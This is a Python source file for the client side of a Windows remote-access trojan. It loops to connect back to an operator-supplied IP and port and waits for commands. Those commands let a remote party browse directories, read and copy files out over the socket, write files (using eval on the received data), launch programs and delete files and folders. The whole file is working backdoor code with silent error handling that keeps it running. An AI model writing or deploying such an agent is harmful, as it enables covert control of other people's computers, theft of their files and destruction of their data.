import socket
import os
from uuid import uuid4

ADDR = # YOUR PUBLIC IP ADDRESS SO YOUR CLIENT CAN CONNECT TO YOU
PORT = # PORT YOU WILL USE TO CONNECT TO THE CLIENT

CURRENT_DIRECTORY = os.getenv('USERPROFILE')
OS_DIR = os.getenv('USERPROFILE')

def recvall(connection):

    data = ''
    
    data += connection.recv(4096).decode()

    dataSplit, data = data.split('|', 1)

    if dataSplit in data:
            data = data.replace('|' + dataSplit, '')
            return data

    while True:

        data += connection.recv(4096).decode()

        if dataSplit in data:
            data = data.replace('|' + dataSplit, '')
            return data

def getMsgWithDataSplit(msg):

    dataSplit = str(uuid4())

    return (dataSplit + '|' + str(msg) + '|' + dataSplit).encode()

while True:

    try:

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

            while True:

                try:
                    s.connect((ADDR, PORT))
                    break
                except:
                    pass

            while True:

                command = recvall(s)

                if command == 'Refresh':
                    s.sendall(getMsgWithDataSplit('online'))

                elif command == 'EstablishConnection':
                    s.sendall(getMsgWithDataSplit(CURRENT_DIRECTORY))
                
                elif command == 'ls':
                    try:
                        listedFiles = os.listdir(OS_DIR)
                    except:
                        listedFiles = 'ERROR'
                    s.sendall(getMsgWithDataSplit(str(listedFiles)))
                
                elif command == 'cd':
                    changedDirectory = recvall(s)
                    if changedDirectory == '..' and os.path.isdir(os.path.abspath(os.path.join(OS_DIR + '\\..'))):
                        OS_DIR += '\\..'
                        CURRENT_DIRECTORY = os.path.abspath(OS_DIR)
                        s.sendall(getMsgWithDataSplit(CURRENT_DIRECTORY))
                    elif os.path.exists(os.path.join(CURRENT_DIRECTORY, changedDirectory)) and os.path.isdir(os.path.abspath(os.path.join(OS_DIR, changedDirectory))):
                        OS_DIR += f'\\{changedDirectory}'
                        CURRENT_DIRECTORY = os.path.abspath(OS_DIR)
                        s.sendall(getMsgWithDataSplit(CURRENT_DIRECTORY))
                    else:
                        s.sendall(getMsgWithDataSplit('ERROR'))
                
                elif command == 'goto':
                    gotoDirectory = recvall(s) + '\\'
                    if os.path.exists(os.path.abspath(gotoDirectory)) and os.path.isdir(os.path.abspath(gotoDirectory)):
                        OS_DIR = os.path.abspath(gotoDirectory)
                        CURRENT_DIRECTORY = OS_DIR
                        s.sendall(getMsgWithDataSplit(CURRENT_DIRECTORY))
                    else:
                        s.sendall(getMsgWithDataSplit('ERROR'))
                
                elif command == 'size':
                    fileName = recvall(s)
                    try:
                        fileSize = os.stat(os.path.join(OS_DIR, fileName)).st_size
                    except:
                        fileSize = False
                    if fileSize:
                        s.sendall(getMsgWithDataSplit(f'{fileSize:,}'))
                    else:
                        s.sendall(getMsgWithDataSplit('ERROR'))
                
                elif command == 'read':
                    fileName = recvall(s)
                    try:
                        with open(os.path.join(OS_DIR, fileName), 'r') as f:
                            s.sendall(getMsgWithDataSplit(f.read()))
                    except:
                        try:
                            with open(os.path.join(OS_DIR, fileName), 'rb') as f:
                                s.sendall(getMsgWithDataSplit(str(f.read())[2:-1]))
                        except:
                            s.sendall(getMsgWithDataSplit('ERROR'))

                
                elif command == 'write':
                    fileName = recvall(s)
                    fileData = recvall(s)
                    if fileData == 'ERROR':
                        pass
                    else:
                        try:
                            if type(eval(fileData)) == bytes:
                                with open(os.path.join(OS_DIR, fileName), 'wb') as f:
                                    f.write(eval(fileData))
                            else:
                                with open(os.path.join(OS_DIR, fileName), 'w') as f:
                                    f.write(fileData)

                            s.sendall(getMsgWithDataSplit(os.path.join(OS_DIR, fileName)))
                        except Exception as e:
                            try:
                                with open(os.path.join(OS_DIR, fileName), 'w') as f:
                                    f.write(fileData)
                                
                                s.sendall(getMsgWithDataSplit(os.path.join(OS_DIR, fileName)))
                            except:
                            
                                s.sendall(getMsgWithDataSplit('ERROR'))
                
                elif command == 'copy':
                    fileName = recvall(s)

                    if os.path.exists(os.path.join(OS_DIR, fileName)):
                        try:
                            with open(os.path.join(OS_DIR, fileName), 'r') as f:
                                fileData = f.read()

                            s.sendall(getMsgWithDataSplit(fileData))
                        except:
                            try:
                                with open(os.path.join(OS_DIR, fileName), 'rb') as f:
                                    fileData = f.read()
                                
                                s.sendall(getMsgWithDataSplit(str(fileData)))
                            except:
                                s.sendall(getMsgWithDataSplit('ERROR'))
                    else:
                        s.sendall(getMsgWithDataSplit('ERROR'))
                
                elif command == 'run':
                    fileName = recvall(s)
                    try:
                        os.startfile(os.path.join(OS_DIR, fileName))
                        s.sendall(getMsgWithDataSplit('Sucess'))
                    except:
                        s.sendall(getMsgWithDataSplit('ERROR'))
                
                elif command == 'rm':
                    fileName = recvall(s)
                    try:
                        os.remove(os.path.join(OS_DIR, fileName))
                        s.sendall(getMsgWithDataSplit('Success'))
                    except:
                        s.sendall(getMsgWithDataSplit('ERROR'))
                
                elif command == 'mkdir':
                    folderName = recvall(s)
                    try:
                        os.mkdir(os.path.join(OS_DIR, folderName))
                        s.sendall(getMsgWithDataSplit('Success'))
                    except:
                        s.sendall(getMsgWithDataSplit('ERROR'))

                
                elif command == 'rmdir':
                    folderName = recvall(s)
                    try:
                        os.rmdir(os.path.join(OS_DIR, folderName))
                        s.sendall(getMsgWithDataSplit('Success'))
                    except:
                        s.sendall(getMsgWithDataSplit('ERROR'))
                
                elif command == 'CloseConnection':
                    OS_DIR = os.getenv('USERPROFILE')
                    CURRENT_DIRECTORY = os.path.abspath(OS_DIR).strip('\\')

                else:
                    OS_DIR = os.getenv('USERPROFILE')
                    CURRENT_DIRECTORY = os.path.abspath(OS_DIR).strip('\\')
                    break

    except:
        CURRENT_DIRECTORY = os.getenv('USERPROFILE')
        OS_DIR = os.getenv('USERPROFILE')